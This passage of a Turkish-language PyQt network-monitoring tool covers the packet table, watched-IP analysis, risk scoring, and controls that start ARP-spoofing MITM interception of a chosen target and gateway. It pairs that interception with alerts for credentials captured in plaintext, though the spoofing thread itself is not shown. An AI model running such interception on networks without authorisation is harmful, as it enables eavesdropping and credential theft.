        self.packet_table.setHorizontalHeaderLabels(["No","Zaman","Kaynak","Hedef","Proto","Güvenlik","Boyut","Bilgi"])
        self.packet_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.packet_table.horizontalHeader().setStretchLastSection(True)
        self.packet_table.horizontalHeader().resizeSection(0,45)
        self.packet_table.horizontalHeader().resizeSection(1,60)
        self.packet_table.horizontalHeader().resizeSection(2,120)
        self.packet_table.horizontalHeader().resizeSection(3,120)
        self.packet_table.horizontalHeader().resizeSection(4,50)
        self.packet_table.horizontalHeader().resizeSection(5,70)
        self.packet_table.horizontalHeader().resizeSection(6,45)
        self.packet_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.packet_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.packet_table.customContextMenuRequested.connect(self.show_packet_menu)
        self.packet_table.itemSelectionChanged.connect(self.on_packet_selected)
        self.packet_table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:6px;font-family:Consolas;font-size:10px;}
            QTableWidget::item{padding:3px;border-bottom:1px solid #1a1a2e;}
            QTableWidget::item:selected{background:#0f3460;}
            QHeaderView::section{background:#16213e;color:#00d4ff;padding:6px;border:none;font-weight:bold;}
        """)
        right_layout.addWidget(self.packet_table)
        
        # Paket detayları
        self.detail_tree=QTreeWidget()
        self.detail_tree.setHeaderHidden(True)
        self.detail_tree.setMaximumHeight(120)
        self.detail_tree.setStyleSheet("""
            QTreeWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:6px;color:white;font-family:Consolas;font-size:10px;}
            QTreeWidget::item{padding:3px;}
        """)
        right_layout.addWidget(self.detail_tree)
        
        main_splitter.addWidget(right_panel)
        main_splitter.setSizes([320,900])
        main_splitter.setStretchFactor(0,0)
        main_splitter.setStretchFactor(1,1)
        
        layout.addWidget(main_splitter,1)  # Stretch factor 1
    
    def on_show_all_changed(self,state):
        """Tüm trafiği göster checkbox değiştiğinde"""
        if state:
            self.add_activity("📡","Tüm ağ trafiği gösteriliyor")
            if self.is_monitoring:
                self.status_label.setText("🔴 TÜM TRAFİK")
                self.status_label.setStyleSheet("color:#f39c12;font-weight:bold;font-size:12px;")
        else:
            if self.watched_ips:
                ip_list=', '.join(self.watched_ips.keys())
                self.add_activity("🎯",f"Sadece izlenen IP'ler: {ip_list}")
                if self.is_monitoring:
                    self.status_label.setText(f"🔴 İZLENİYOR: {ip_list[:30]}")
                    self.status_label.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;")
            else:
                self.add_activity("⚠️","İzlenecek IP eklenmedi")
    
    def add_my_ip(self):
        """Bu bilgisayarın IP'sini izlemeye ekle"""
        try:
            import socket
            # Tüm IP adreslerini al
            hostname=socket.gethostname()
            local_ips=socket.gethostbyname_ex(hostname)[2]
            
            for ip in local_ips:
                if ip.startswith("127."):continue  # Localhost'u atla
                self.ip_input.setText(ip)
                self.add_watch_ip()
                self.add_activity("🖥️",f"Bu bilgisayarın IP'si eklendi: {ip}")
                return
            
            # Alternatif yöntem
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8",80))
                ip=s.getsockname()[0]
                self.ip_input.setText(ip)
                self.add_watch_ip()
                self.add_activity("🖥️",f"Bu bilgisayarın IP'si eklendi: {ip}")
            finally:
                s.close()
        except Exception as e:
            self.add_activity("⚠️",f"IP alınamadı: {str(e)[:30]}")
    
    def detect_gateway(self):
        """Gateway IP'sini otomatik bul"""
        try:
            if platform.system()=="Windows":
                # Windows'ta default gateway bul
                result=subprocess.run(['ipconfig'],capture_output=True,text=True,creationflags=subprocess.CREATE_NO_WINDOW if platform.system()=="Windows" else 0)
                lines=result.stdout.split('\n')
                for i,line in enumerate(lines):
                    if 'Default Gateway' in line or 'Varsayılan Ağ Geçidi' in line:
                        parts=line.split(':')
                        if len(parts)>1:
                            gw=parts[1].strip()
                            if gw and gw[0].isdigit():
                                self.arp_gateway_ip.setText(gw)
                                self.add_activity("🌐",f"Gateway bulundu: {gw}")
                                return
            else:
                # Linux
                result=subprocess.run(['ip','route'],capture_output=True,text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts=line.split()
                        for i,p in enumerate(parts):
                            if p=='via' and i+1<len(parts):
                                gw=parts[i+1]
                                self.arp_gateway_ip.setText(gw)
                                self.add_activity("🌐",f"Gateway bulundu: {gw}")
                                return
            self.add_activity("⚠️","Gateway bulunamadı")
        except Exception as e:
            self.add_activity("⚠️",f"Gateway bulunamadı: {str(e)[:30]}")
    
    def toggle_arp_spoof(self):
        """ARP Spoofing başlat/durdur"""
        if self.is_arp_spoofing:
            self.stop_arp_spoof()
        else:
            self.start_arp_spoof()
    
    def start_arp_spoof(self):
        """ARP Spoofing başlat"""
        target=self.arp_target_ip.text().strip()
        gateway=self.arp_gateway_ip.text().strip()
        
        if not target:
            self.add_activity("⚠️","Hedef IP girilmedi!")
            return
        if not gateway:
            self.add_activity("⚠️","Gateway IP girilmedi!")
            return
        
        # Scapy kontrolü
        if not SCAPY_AVAILABLE:
            self.add_activity("⚠️","ARP Spoofing için Scapy gerekli!")
            self.add_activity("💡","'pip install scapy' çalıştırın")
            return
        
        try:
            self.is_arp_spoofing=True
            self.arp_spoof_btn.setText("⏹ MITM DURDUR")
            self.arp_spoof_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:8px;border:none;border-radius:6px;font-weight:bold;}QPushButton:hover{background:#c0392b;}")
            self.arp_status.setText("🔴 ARP Spoofing Aktif")
            self.arp_status.setStyleSheet("color:#ff6600;font-weight:bold;font-size:10px;")
            
            # Hedef IP'yi izlemeye ekle
            if target not in self.watched_ips:
                self.ip_input.setText(target)
                self.add_watch_ip()
            
            # ARP Spoof thread başlat
            self.arp_spoof_thread=ARPSpoofThread(target,gateway)
            self.arp_spoof_thread.status_update.connect(self.on_arp_status)
            self.arp_spoof_thread.error_occurred.connect(self.on_arp_error)
            self.arp_spoof_thread.start()
            
            self.add_activity("🕵️",f"MITM başlatıldı: {target} ↔ {gateway}")
            self.add_activity("⚠️","Hedef cihazın trafiği bu bilgisayar üzerinden geçecek")
            self.add_activity("💡","Paket yakalamayı da başlatın!")
            
            # Paket yakalama başlat
            if not self.is_monitoring:
                self.start_monitoring()
        except Exception as e:
            self.add_activity("⚠️",f"MITM başlatılamadı: {str(e)[:40]}")
            self.is_arp_spoofing=False
    
    def stop_arp_spoof(self):
        """ARP Spoofing durdur"""
        try:
            if self.arp_spoof_thread:
                self.arp_spoof_thread.stop()
                self.arp_spoof_thread.wait(2000)
                self.arp_spoof_thread=None
            
            self.is_arp_spoofing=False
            self.arp_spoof_btn.setText("🕵️ MITM BAŞLAT")
            self.arp_spoof_btn.setStyleSheet("QPushButton{background:#ff6600;color:white;padding:8px;border:none;border-radius:6px;font-weight:bold;}QPushButton:hover{background:#cc5200;}")
            self.arp_status.setText("⏸ Pasif - ARP tablosu düzeltildi")
            self.arp_status.setStyleSheet("color:#00ff88;font-size:10px;")
            
            self.add_activity("⏹","MITM durduruldu - ARP tabloları düzeltildi")
        except Exception as e:
            self.add_activity("⚠️",f"Durdurma hatası: {str(e)[:30]}")
    
    def on_arp_status(self,msg):
        """ARP Spoof durum güncellemesi"""
        self.arp_status.setText(msg)
    
    def on_arp_error(self,msg):
        """ARP Spoof hata"""
        self.add_activity("⚠️",msg)
        self.stop_arp_spoof()
    
    def toggle_monitoring(self):
        try:
            if self.is_monitoring:
                self.stop_monitoring()
            else:
                self.start_monitoring()
        except Exception as e:
            self.is_monitoring=False
            self.monitor_thread=None
    
    def start_monitoring(self):
        try:
            # Önceki thread varsa temizle
            if self.monitor_thread:
                try:
                    self.monitor_thread.running=False
                    self.monitor_thread.stop()
                except:pass
                self.monitor_thread=None
            
            self.is_monitoring=True
            self.main_btn.setText("⏹ DURDUR")
            self.main_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:10px 25px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}QPushButton:hover{background:#c0392b;}")
            
            # DeepPacketThread kullan - gerçek paket yakalama
            self.monitor_thread=DeepPacketThread()
            self.monitor_thread.packet_captured.connect(self.on_packet,Qt.ConnectionType.QueuedConnection)
            self.monitor_thread.debug_info.connect(self.on_debug,Qt.ConnectionType.QueuedConnection)
            self.monitor_thread.security_alert.connect(self.on_security_alert,Qt.ConnectionType.QueuedConnection)
            self.monitor_thread.http_request.connect(self.on_http_request,Qt.ConnectionType.QueuedConnection)
            self.monitor_thread.credential_found.connect(self.on_credential_found,Qt.ConnectionType.QueuedConnection)
            self.monitor_thread.start()
            
            self.add_activity("🟢","Deep Packet Inspection başlatıldı...")
            
            # "Tümü" checkbox durumunu kontrol et
            if self.show_all_traffic.isChecked():
                self.status_label.setText("🔴 TÜM TRAFİK")
                self.status_label.setStyleSheet("color:#f39c12;font-weight:bold;font-size:12px;")
                self.add_activity("📡","Tüm ağ trafiği izleniyor")
            elif self.watched_ips:
                ip_list=', '.join(self.watched_ips.keys())
                self.status_label.setText(f"🔴 İZLENİYOR: {ip_list[:30]}")
                self.status_label.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;")
                self.add_activity("🎯",f"İzlenen IP'ler: {ip_list}")
                
                # Kendi IP'miz mi kontrol et
                try:
                    import socket
                    local_ip=socket.gethostbyname(socket.gethostname())
                    is_local=any(ip==local_ip for ip in self.watched_ips)
                    
                    if is_local:
                        self.add_activity("✅","Bu bilgisayarın trafiği izleniyor")
                    else:
                        self.add_activity("⚠️","DİKKAT: Farklı bilgisayar izleniyor!")
                        self.add_activity("💡","Not: Switch ağlarda sadece ARP/broadcast görünür")
                        self.add_activity("📝",f"Kendi IP'niz: {local_ip}")
                except:pass
            else:
                self.status_label.setText("⚠️ IP EKLEYİN veya TÜMÜ")
                self.status_label.setStyleSheet("color:#f39c12;font-weight:bold;font-size:12px;")
                self.add_activity("⚠️","Uyarı: İzlenecek IP eklenmedi!")
                self.add_activity("💡","IP ekleyin veya 'Tümü' işaretleyin")
        except Exception as e:
            self.is_monitoring=False
            self.monitor_thread=None
    
    def on_security_alert(self,alert):
        """Güvenlik uyarısı geldiğinde"""
        severity=alert.get('severity','info')
        msg=alert.get('message','Güvenlik uyarısı')
        
        if severity=='critical':
            self.add_activity("🚨",msg,f"URL: {alert.get('url','')}")
            self.security_alerts.append(alert)
            self.update_security_panel()
        elif severity=='warning':
            self.add_activity("⚠️",msg)
    
    def on_http_request(self,http_data):
        """HTTP isteği yakalandığında"""
        method=http_data.get('method','')
        url=http_data.get('url','')
        
        if method=='POST':
            self.add_activity("📝",f"HTTP POST: {url[:50]}",f"Form verisi gönderildi")
        else:
            self.add_activity("🌐",f"HTTP {method}: {url[:50]}")
    
    def on_credential_found(self,cred):
        """Şifresiz credential bulunduğunda"""
        field=cred.get('field','')
        url=cred.get('url','')
        
        self.add_activity("🚨",f"⚠️ ŞİFRELENMEMİŞ {field.upper()} TESPİT EDİLDİ!",
                         f"URL: {url[:40]} - Bu bağlantı güvenli değil!")
        
        # Güvenlik paneline ekle
        self.security_alerts.append(cred)
        self.update_security_panel()
    
    def on_debug(self,msg):
        """Debug mesajlarını göster"""
        self.add_activity("🔧",msg)
    
    def stop_monitoring(self):
        self.is_monitoring=False
        self.main_btn.setText("▶ YAKALAMAYA BAŞLA")
        self.main_btn.setStyleSheet("QPushButton{background:#00ff88;color:#0a0a14;padding:10px 25px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}QPushButton:hover{background:#00cc6a;}")
        self.status_label.setText(f"⏸ Durduruldu ({len(self.packets)} paket)")
        self.status_label.setStyleSheet("color:#f39c12;font-weight:bold;font-size:12px;")
        
        try:
            if self.monitor_thread:
                # Önce sinyalleri kes
                try:
                    self.monitor_thread.packet_captured.disconnect()
                    self.monitor_thread.debug_info.disconnect()
                    # Yeni sinyaller
                    try:self.monitor_thread.security_alert.disconnect()
                    except:pass
                    try:self.monitor_thread.http_request.disconnect()
                    except:pass
                    try:self.monitor_thread.credential_found.disconnect()
                    except:pass
                except:
                    pass
                
                # Thread'i durdur
                self.monitor_thread.running=False
                self.monitor_thread.stop()
                
                # Kısa bekle, zorla kapatma
                try:
                    finished=self.monitor_thread.wait(500)
                    if not finished:
                        self.monitor_thread.terminate()
                except:
                    pass
                
                self.monitor_thread=None
        except Exception as e:
            self.monitor_thread=None
        
        self.add_activity("🔴","Yakalama durduruldu")
    
    def update_security_panel(self):
        """Güvenlik uyarıları panelini güncelle"""
        if hasattr(self,'security_list'):
            self.security_list.clear()
            for alert in self.security_alerts[-20:]:  # Son 20 uyarı
                severity=alert.get('severity','info')
                msg=alert.get('message','')
                url=alert.get('url','')
                
                item=QListWidgetItem(f"{msg}\n  └─ {url[:50]}")
                
                if severity=='critical':
                    item.setForeground(QColor("#ff4444"))
                    item.setBackground(QColor("#2a0a0a"))
                elif severity=='warning':
                    item.setForeground(QColor("#ffaa00"))
                    item.setBackground(QColor("#2a1a0a"))
                
                self.security_list.addItem(item)
    
    def clear_all(self):
        self.packets.clear()
        self.packet_table.setRowCount(0)
        self.detail_tree.clear()
        self.activity_list.clear()
        self.packet_count.setText("📦 0")
        self.stat_total.setText("📦 Toplam: 0")
        self.stat_tcp.setText("🔵 TCP: 0")
        self.stat_udp.setText("🟢 UDP: 0")
        self.stat_arp.setText("🟡 ARP: 0")
        for ip in self.watched_ips:
            self.watched_ips[ip]['packets'].clear()
            self.watched_ips[ip]['stats']={'tcp':0,'udp':0,'arp':0,'other':0}
            self.watched_ips[ip]['domains']=set()
            self.watched_ips[ip]['ports']=set()
            self.watched_ips[ip]['protos']=set()
            self.watched_ips[ip]['bytes']=0
            self.watched_ips[ip]['first_seen']=None
            self.watched_ips[ip]['last_seen']=None
        self.update_watch_list()
        
        # Analiz panelini sıfırla
        if self.selected_watch_ip:
            self.update_ip_analysis(self.selected_watch_ip)
        
        self.add_activity("🗑","Tüm veriler temizlendi")
    
    def add_watch_ip(self):
        """İzlenecek IP ekle"""
        ip=self.ip_input.text().strip()
        if not ip:return
        
        if ip not in self.watched_ips:
            self.watched_ips[ip]={
                'packets':[],'stats':{'tcp':0,'udp':0,'arp':0,'other':0},
                'first_seen':None,'last_seen':None,'ports':set(),'protos':set(),
                'domains':set(),'bytes':0,'http_count':0,'https_count':0
            }
            self.update_watch_list()
            self.add_activity("🎯",f"IP izlemeye alındı: {ip}","Sadece bu IP'nin trafiği gösterilecek")
            
            # Analiz panelini güncelle
            self.selected_watch_ip=ip
            self.update_ip_analysis(ip)
            
            # Monitoring aktifse status güncelle
            if self.is_monitoring:
                ip_list=', '.join(self.watched_ips.keys())
                self.status_label.setText(f"🔴 İZLENİYOR: {ip_list[:30]}")
                self.status_label.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;")
        
        self.ip_input.clear()
    
    def update_watch_list(self):
        """İzlenen IP listesini güncelle"""
        self.watch_list.clear()
        for ip,data in self.watched_ips.items():
            count=len(data['packets'])
            item=QListWidgetItem(f"🎯 {ip}  ({count} paket)")
            item.setData(Qt.ItemDataRole.UserRole,ip)
            if count>0:
                item.setForeground(QColor("#00ff88"))
            else:
                item.setForeground(QColor("#888"))
            self.watch_list.addItem(item)
    
    def on_watch_selected(self,item):
        """İzlenen IP seçildiğinde detaylı analiz göster"""
        ip=item.data(Qt.ItemDataRole.UserRole)
        if not ip or ip not in self.watched_ips:return
        
        self.selected_watch_ip=ip
        self.update_ip_analysis(ip)
    
    def show_ip_analysis(self,item):
        """Çift tıklamada sadece bu IP'yi filtrele"""
        ip=item.data(Qt.ItemDataRole.UserRole)
        if ip:
            self.filter_input.setText(ip)
            self.selected_watch_ip=ip
    
    def filter_watched_ip_only(self):
        """Sadece seçili IP'yi göster"""
        if self.selected_watch_ip:
            self.filter_input.setText(self.selected_watch_ip)
    
    def update_ip_analysis(self,ip):
        """IP için profesyonel analiz güncelle"""
        if ip not in self.watched_ips:return
        
        data=self.watched_ips[ip]
        packets=data['packets']
        
        # Temel bilgiler
        self.stat_ip.setText(f"🎯 IP: {ip}")
        self.stat_packets.setText(f"📦 Toplam Paket: {len(packets)}")
        
        # Toplam veri boyutu
        total_bytes=sum(getattr(p,'length',0) for p in packets)
        if total_bytes>1024*1024:
            size_str=f"{total_bytes/1024/1024:.2f} MB"
        elif total_bytes>1024:
            size_str=f"{total_bytes/1024:.2f} KB"
        else:
            size_str=f"{total_bytes} B"
        self.stat_bytes.setText(f"📊 Veri: {size_str}")
        
        # Zaman bilgileri
        if data['first_seen']:
            self.stat_first.setText(f"⏱ İlk: {data['first_seen']}")
        if data['last_seen']:
            self.stat_last.setText(f"⏱ Son: {data['last_seen']}")
        
        # Protokol dağılımı
        proto_counts={'TCP':0,'UDP':0,'HTTP':0,'HTTPS':0,'DNS':0,'ARP':0,'OTHER':0}
        for p in packets:
            proto=p.protocol.upper()
            if proto in proto_counts:
                proto_counts[proto]+=1
            else:
                proto_counts['OTHER']+=1
        
        # Protokol barlarını temizle ve yeniden oluştur
        while self.proto_layout.count():
            item=self.proto_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
        
        total=sum(proto_counts.values()) or 1
        proto_colors={'TCP':'#5294e2','UDP':'#73d216','HTTP':'#f5c211','HTTPS':'#00ff88','DNS':'#9b59b6','ARP':'#e74c3c','OTHER':'#555'}
        
        for proto,count in sorted(proto_counts.items(),key=lambda x:-x[1]):
            if count==0:continue
            pct=count/total*100
            
            bar_frame=QFrame()
            bar_layout=QHBoxLayout(bar_frame)
            bar_layout.setContentsMargins(0,0,0,0)
            bar_layout.setSpacing(5)
            
            label=QLabel(f"{proto}")
            label.setStyleSheet(f"color:{proto_colors.get(proto,'#fff')};font-size:10px;min-width:50px;")
            bar_layout.addWidget(label)
            
            bar=QProgressBar()
            bar.setMaximum(100)
            bar.setValue(int(pct))
            bar.setTextVisible(False)
            bar.setMaximumHeight(12)
            bar.setStyleSheet(f"""
                QProgressBar{{background:#1a1a2e;border-radius:6px;}}
                QProgressBar::chunk{{background:{proto_colors.get(proto,'#fff')};border-radius:6px;}}
            """)
            bar_layout.addWidget(bar,1)
            
            pct_label=QLabel(f"{count} ({pct:.1f}%)")
            pct_label.setStyleSheet("color:#888;font-size:10px;min-width:60px;")
            bar_layout.addWidget(pct_label)
            
            self.proto_layout.addWidget(bar_frame)
        
        # Domain listesi
        self.domain_list.clear()
        domains=data.get('domains',set())
        for domain in sorted(domains):
            if domain:
                item=QListWidgetItem(f"🌐 {domain}")
                item.setForeground(QColor("#00d4ff"))
                self.domain_list.addItem(item)
        
        if not domains:
            item=QListWidgetItem("(Domain tespit edilmedi)")
            item.setForeground(QColor("#666"))
            self.domain_list.addItem(item)
        
        # Port listesi
        ports=data.get('ports',set())
        if ports:
            port_strs=[]
            for port in sorted(ports)[:15]:
                service=TRAFFIC_TYPES.get(port,'')
                if service:
                    port_strs.append(f"{port} ({service})")
                else:
                    port_strs.append(str(port))
            self.port_list.setText(', '.join(port_strs))
        else:
            self.port_list.setText("-")
        
        # ===== GÜVENLİK ANALİZİ =====
        risks=[]
        score=100
        
        # HTTP trafiği (şifresiz) kontrolü
        if proto_counts['HTTP']>0:
            risks.append(("🔴 CRITICAL","HTTP trafiği tespit edildi - Şifresiz bağlantı!"))
            score-=30
        
        # Şüpheli portlar kontrolü
        suspicious_ports={23:'Telnet',21:'FTP',25:'SMTP',110:'POP3',143:'IMAP',3389:'RDP',5900:'VNC'}
        for port in ports:
            if port in suspicious_ports:
                risks.append(("🟡 WARNING",f"Port {port} ({suspicious_ports[port]}) açık"))
                score-=10
        
        # Yoğun trafik kontrolü
        if len(packets)>500:
            risks.append(("🟡 WARNING","Yoğun trafik tespit edildi"))
            score-=5
        
        # Çok fazla port kullanımı
        if len(ports)>20:
            risks.append(("🟡 WARNING",f"{len(ports)} farklı port kullanımı - Port taraması olabilir"))
            score-=15
        
        # DNS sorgusu çokluğu
        if proto_counts['DNS']>50:
            risks.append(("🟡 WARNING","Yoğun DNS sorgusu - DNS tüneli olabilir"))
            score-=10
        
        # ARP flood kontrolü
        if proto_counts['ARP']>100:
            risks.append(("🔴 CRITICAL","ARP flood tespit edildi - MITM saldırısı olabilir!"))
            score-=25
        
        # Bilinmeyen domainler
        unknown_domains=[d for d in domains if d and not any(k in d.lower() for k in ['google','microsoft','apple','amazon','cloudflare','facebook','youtube'])]
        if len(unknown_domains)>5:
            risks.append(("🟡 WARNING",f"{len(unknown_domains)} bilinmeyen domain'e bağlantı"))
            score-=5
        
        # Güvenlik skoru güncelle
        score=max(0,min(100,score))
        self.security_score.setText(f"{score}")
        
        if score>=80:
            self.security_score.setStyleSheet("color:#00ff88;font-size:24px;font-weight:bold;")
            self.security_status.setText("✅ GÜVENLİ")
            self.security_status.setStyleSheet("color:#00ff88;font-size:11px;font-weight:bold;")
        elif score>=60:
            self.security_score.setStyleSheet("color:#f39c12;font-size:24px;font-weight:bold;")
            self.security_status.setText("⚠️ DİKKAT")
            self.security_status.setStyleSheet("color:#f39c12;font-size:11px;font-weight:bold;")
        elif score>=40:
            self.security_score.setStyleSheet("color:#e67e22;font-size:24px;font-weight:bold;")
            self.security_status.setText("⚠️ RİSKLİ")
            self.security_status.setStyleSheet("color:#e67e22;font-size:11px;font-weight:bold;")
        else:
            self.security_score.setStyleSheet("color:#e74c3c;font-size:24px;font-weight:bold;")
            self.security_status.setText("🚨 TEHLİKELİ")
            self.security_status.setStyleSheet("color:#e74c3c;font-size:11px;font-weight:bold;")
        
        # Risk listesi güncelle
        self.risk_list.clear()
        if risks:
            for severity,msg in risks:
                item=QListWidgetItem(f"{severity} {msg}")
                if "CRITICAL" in severity:
                    item.setForeground(QColor("#ff4444"))
                    item.setBackground(QColor("#2a0a0a"))
                else:
                    item.setForeground(QColor("#f39c12"))
                self.risk_list.addItem(item)
        else:
            item=QListWidgetItem("✅ Risk tespit edilmedi")
            item.setForeground(QColor("#00ff88"))
            self.risk_list.addItem(item)
    
    def show_watch_menu(self,pos):
        """İzlenen IP sağ tık menüsü"""
        item=self.watch_list.itemAt(pos)
        if not item:return
        
        ip=item.data(Qt.ItemDataRole.UserRole)
        
        menu=QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:2px solid #00ff88;border-radius:8px;padding:5px;}
            QMenu::item{padding:10px 20px;border-radius:4px;}
            QMenu::item:selected{background:#00ff88;color:#0a0a14;}
        """)
        
        menu.addAction(f"🎯 {ip}").setEnabled(False)
        menu.addSeparator()
        menu.addAction("🔍 Filtrele").triggered.connect(lambda:self.filter_input.setText(ip))
        menu.addAction("📋 IP Kopyala").triggered.connect(lambda:QApplication.clipboard().setText(ip))
        menu.addSeparator()
        menu.addAction("🗑 İzlemeyi Kaldır").triggered.connect(lambda:self.remove_watch_ip(ip))
        
        menu.exec(self.watch_list.viewport().mapToGlobal(pos))
    
    def remove_watch_ip(self,ip):
        if ip in self.watched_ips:
            del self.watched_ips[ip]
            self.update_watch_list()
            self.add_activity("❌",f"IP izlemeden çıkarıldı: {ip}")
            
            # Seçili IP silindiyse sıfırla
            if self.selected_watch_ip==ip:
                self.selected_watch_ip=None
            
            # Monitoring aktifse status güncelle
            if self.is_monitoring:
                if self.watched_ips:
                    ip_list=', '.join(self.watched_ips.keys())
                    self.status_label.setText(f"🔴 İZLENİYOR: {ip_list[:30]}")
                else:
                    self.status_label.setText("⚠️ IP EKLEYİN")
                    self.status_label.setStyleSheet("color:#f39c12;font-weight:bold;font-size:12px;")
                    self.add_activity("⚠️","Tüm IP'ler kaldırıldı - yeni IP ekleyin")
    
    def on_packet(self,packet):
        """Paket yakalandığında - SADECE İZLENEN IP'LERİ GÖSTER"""
        try:
            if not self.is_monitoring:
                return
            
            # Paket bilgilerini al
            pkt_src=packet.src_ip or ''
            pkt_dst=packet.dst_ip or ''
            
            # ===== SADECE İZLENEN IP'LERİ FİLTRELE =====
            # "Tümü" işaretli değilse ve izlenen IP varsa filtrele
            show_all=self.show_all_traffic.isChecked()
            
            if not show_all and self.watched_ips:
                is_watched=False
                for watch_ip in self.watched_ips:
                    # Tam eşleşme veya içerme kontrolü
                    if watch_ip==pkt_src or watch_ip==pkt_dst:
                        is_watched=True
                        break
                    # IP subnet kontrolü (10.248.63.x gibi)
                    if watch_ip in pkt_src or watch_ip in pkt_dst:
                        is_watched=True
                        break
                    # Kaynak veya hedef içinde IP var mı
                    if pkt_src.startswith(watch_ip) or pkt_dst.startswith(watch_ip):
                        is_watched=True
                        break
                
                if not is_watched:
                    return  # Bu paket izlenen IP'lere ait değil, atla
            
            self.packets.append(packet)
            self.packet_count.setText(f"📦 {len(self.packets)}")
            
            # Domain bilgisi varsa al
            domain=getattr(packet,'domain','') or ''
            traffic_type=getattr(packet,'traffic_type','') or ''
            
            # Protokol bazlı ikon belirle
            proto=packet.protocol.upper()
            if proto in ['TCP','HTTP','HTTPS','SSH','FTP','SMTP']:
                icon="🌐"
            elif proto in ['UDP','DNS']:
                icon="📡"
            elif proto=='ARP':
                icon="🔶"
            else:
                icon="📦"
            
            # Her paket için detaylı log - domain ile birlikte
            dst_info=f"{packet.dst_ip}:{packet.dst_port}" if packet.dst_port else packet.dst_ip
            
            # Ana satır
            if domain:
                main_text=f"{proto} → {domain}"
            else:
                main_text=f"{proto} → {dst_info}"
            
            # Detay satırı
            detail_text=f"{traffic_type} | {packet.info}" if traffic_type else packet.info
            
            self.add_activity(icon,main_text,detail_text)
            
            # İzlenen IP'lere ekle
            now=datetime.now().strftime("%H:%M:%S")
            for ip in self.watched_ips:
                if ip in packet.src_ip or ip in packet.dst_ip:
                    data=self.watched_ips[ip]
                    data['packets'].append(packet)
                    data['last_seen']=now
                    if not data['first_seen']:
                        data['first_seen']=now
                    
                    data['protos'].add(proto)
                    if packet.src_port:data['ports'].add(packet.src_port)
                    if packet.dst_port:data['ports'].add(packet.dst_port)
                    
                    # Domain'i de kaydet
                    if 'domains' not in data:
                        data['domains']=set()
                    if domain:
                        data['domains'].add(domain)
                    
                    # Byte sayısı
                    if 'bytes' not in data:
                        data['bytes']=0
                    data['bytes']+=getattr(packet,'length',0)
                    
                    # Protokol istatistikleri
                    if proto in ['TCP','HTTP','HTTPS','SSH','FTP','SMTP']:data['stats']['tcp']+=1
                    elif proto in ['UDP','DNS']:data['stats']['udp']+=1
                    elif proto=='ARP':data['stats']['arp']+=1
                    else:data['stats']['other']+=1
                    
                    # Seçili IP ise analiz panelini güncelle
                    if self.selected_watch_ip==ip:
                        self.update_ip_analysis(ip)
        
            self.update_watch_list()
            self.update_stats()
            
            # Tabloya ekle (filtre kontrolü)
            if self.matches_filter(packet):
                self.add_packet_to_table(packet)
        except Exception as e:
            pass  # Hata olursa sessizce geç
    
    def add_packet_to_table(self,packet):
        row=self.packet_table.rowCount()
        self.packet_table.insertRow(row)
        
        proto_color=PROTOCOL_COLORS.get(packet.protocol,PROTOCOL_COLORS.get('UNKNOWN','#555'))
        
        # İzlenen IP mi kontrol et
        is_watched=any(ip in packet.src_ip or ip in packet.dst_ip for ip in self.watched_ips)
        
        # Domain bilgisi
        domain=getattr(packet,'domain','') or ''
        security_level=getattr(packet,'security_level','info')
        has_credential=getattr(packet,'has_credential',False)
        
        # Protokol ve port bazlı güvenlik durumu belirleme
        proto=packet.protocol.upper()
        dst_port=packet.dst_port or 0
        
        # Güvenlik durumu
        if proto=='HTTPS' or dst_port==443:
            security_status="🔒 Şifreli"
            security_color="#00ff88"
            can_see_data=False
        elif proto=='HTTP' or dst_port==80:
            security_status="⚠️ AÇIK"
            security_color="#ff6600"
            can_see_data=True
        elif proto in ['SSH'] or dst_port==22:
            security_status="🔒 Şifreli"
            security_color="#00ff88"
            can_see_data=False
        elif proto in ['FTP','TELNET'] or dst_port in [21,23]:
            security_status="🚨 TEHLİKE"
            security_color="#ff0000"
            can_see_data=True
        elif proto=='DNS' or dst_port==53:
            security_status="📡 DNS"
            security_color="#9b59b6"
            can_see_data=True  # DNS sorguları görünür
        elif proto=='ARP':
            security_status="🔶 ARP"
            security_color="#f5c211"
            can_see_data=True
        elif dst_port in [25,110,143]:  # SMTP, POP3, IMAP
            security_status="⚠️ AÇIK"
            security_color="#ff6600"
            can_see_data=True
        elif dst_port==3389:  # RDP
            security_status="🔒 RDP"
            security_color="#00d4ff"
            can_see_data=False
        else:
            security_status="❓ Bilinmiyor"
            security_color="#888"
            can_see_data=False
        
        # Credential bulunduysa özel durum
        if has_credential:
            security_status="🚨 ŞİFRE!"
            security_color="#ff0000"
        
        # Info alanını domain ile birleştir
        info_display=domain if domain else packet.info[:40]
        
        # Güvenlik seviyesine göre prefix ekle
        if security_level=='critical' or has_credential:
            info_display=f"🚨 {info_display}"
        elif security_level=='warning':
            info_display=f"⚠️ {info_display}"
        
        # Paket'e güvenlik bilgisi ekle (sonradan kullanmak için)
        packet.security_status=security_status
        packet.can_see_data=can_see_data
        
        items=[
            (str(packet.no),None),
            (f"{packet.timestamp:.2f}",None),
            (packet.source,"#aaa"),
            (packet.destination,"#aaa"),
            (packet.protocol,proto_color),
            (security_status,security_color),
            (str(packet.length),None),
            (info_display,None)
        ]
        
        for col,(text,color) in enumerate(items):
            item=QTableWidgetItem(text)
            if color:item.setForeground(QColor(color))
            if col==4:
                item.setBackground(QColor(proto_color).darker(300))
                item.setForeground(QColor(proto_color))
            # Güvenlik kolonu özel renklendirme
            if col==5:
                item.setForeground(QColor(security_color))
                if "AÇIK" in security_status or "TEHLİKE" in security_status or "ŞİFRE" in security_status:
                    item.setBackground(QColor("#2a0a0a"))
                elif "Şifreli" in security_status:
                    item.setBackground(QColor("#0a2a0a"))
            # İzlenen IP ise vurgula
            if is_watched and col in [2,3]:
